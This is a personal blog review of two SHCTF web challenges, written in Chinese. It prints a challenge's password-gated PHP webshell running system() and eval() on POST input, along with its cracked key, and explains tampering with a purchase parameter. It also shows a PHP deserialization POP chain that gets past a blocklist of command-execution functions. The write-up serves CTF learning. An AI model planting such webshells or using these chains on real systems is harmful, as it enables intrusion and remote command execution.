---
title: "SHCTF个人复盘"
image: ''
pinned: false
comment: true
published: 2026-02-13
description: "学习复盘"
category: 复盘
tags: [复盘]
---

















这是一个个人重新复盘在SHCTF中看见的不足和学习到的知识点。

# Challenge Info - [阶段1] 05_em_v_CFK :

首先来讲，这个题目靶机的前端页面下隐藏了一段密文，十分明显，通过随波逐流的一键解密直接得到隐藏信息，

> 我上传了个 shell.php，带上 show 参数 get 小明的圣遗物吧

由此可见，即存在webshell，需要我们自行寻找，简单尝试，最终通过disearch的工具扫描发现了存在/uploads目录，那就极有可能，webshell是藏在uploads目录下的，直接尝试/uploads/shell.php?show=1，得到了题目的隐藏信息。

这边的考点就是猜测目录，然后尝试调用webshell。

```
<?php
if (isset($_GET['show'])) {
highlight_file(__FILE__);
}
$pass = 'c4d038b4bed09fdb1471ef51ec3a32cd';
if (isset($_POST['key']) && md5($_POST['key']) === $pass) {
if (isset($_POST['cmd'])) {
system($_POST['cmd']);
} elseif (isset($_POST['code'])) {
eval($_POST['code']);
}
} else {
http_response_code(404);
}
```

这里的webshell并不像我想象中的直接执行命令的shell，而是给了一段php代码。

内容大抵是：

当读取shell.php带有show参数时，高亮显示源码。

参数key存在且md5哈希强制等于pass的值，直接通过md5的在线碰撞就能得到114514，之后可以使用cmd执行或者code执行命令。

cmd由于设置是 `system($_POST['cmd']);` ，相当于是直接在linux系统下执行，类似ls，cat，whoami的直接命令执行；而code就不一样了，它给的是 `eval($_POST['code']);` ，需要的是我们使用php语句的命令，比如phpinfo();`, `echo "hello";`, `include('config.php') ，两者存在差别，但起到的效果大差不差。

通过举出当前目录的文件，读取题目配置文件，发现了漏洞点：

```
$stmt = $pdo->prepare("CALL buy_item(?, ?)");
$stmt->execute([$target_id, $my_money]); 
```

这里可以用抓包直接修改，把 `$my_money` 改成 `999999` ，那直接就拥有了能拿到flag的钱，如果题目修改一下，这边改成后端从 `$target_id` 中读取money的方式，就能把这个漏洞补上了。

所以仔细思考起来，这题的考点就涉及目录猜测，代码审计，抓包。

不难。



---



# Challenge Info - [阶段1] Ezphp

这题是很直接的php反序列化的题目。

仅仅存在一个__call过滤system的函数，稍微绕一点，但只要通过readfile就可以绕过。

只要找到一条合适的pop链，一路触发就可以完成题目。

```
<?php
highlight_file(__FILE__);
error_reporting(0);

class Sun
{
    public $sun;

    public function __destruct()
    {
        die("Maybe you should fly to the " . $this->sun);
    }
}

class Solar
{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;

    public function __set($name, $key)
    {
        $this->Mars = $key;
        $Dyson = $this->Mercury;
        $Sphere = $this->Venus;
        $Dyson->$Sphere($this->Mars);
    }

    public function __call($func, $args)
    {
        if (!preg_match("/exec|popen|popens|system|shell_exec|assert|eval|print|printf|array_keys|sleep|pack|array_pop|array_filter|highlight_file|show_source|file_put_contents|call_user_func|passthru|curl_exec/i", $args[0])) {
            $exploar = new $func($args[0]);
            $road = $this->Jupiter;
            $exploar->$road($this->Saturn);
        } else {
            die("Black hole");
        }
    }
}

class Moon
{
    public $nearside;
    public $farside;

    public function __tostring()
    {
        $starship = $this->nearside;
        $starship();
        return '';
    }
}

class Earth
{
    public $onearth;
    public $inearth;
    public $outofearth;

    public function __invoke()
    {
        $oe = $this->onearth;
        $ie = $this->inearth;
        $ote = $this->outofearth;
        $oe->$ie = $ote;
    }
}

if (isset($_POST['travel'])) {
    $a = unserialize($_POST['travel']);
    throw new Exception("How to Travel?");
}
```

**`Sun` 开始 **：它需要一个能被当做字符串的对象 $\rightarrow$ 找到 `Moon` 类的 `__tostring`。

**在 `Moon` 中**：它的 `__tostring` 执行了 `$starship()`（把属性当函数调） $\rightarrow$ 寻找有 `__invoke` 的类 $\rightarrow$ 找到 `Earth` 类。

**在 `Earth` 中**：它的 `__invoke` 执行了 `$oe->$ie = $ote;`（赋值操作） $\rightarrow$ 如果 `$oe` 是个对象，且 `$ie` 是它的私有属性，就会触发 `__set` $\rightarrow$ 找到 `Solar` 类的 `__set`。

**在 `Solar` 中**：它的 `__set` 执行了 `$Dyson->$Sphere(...)`（调用方法） $\rightarrow$ 如果方法不存在，触发 `__call`。

















---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
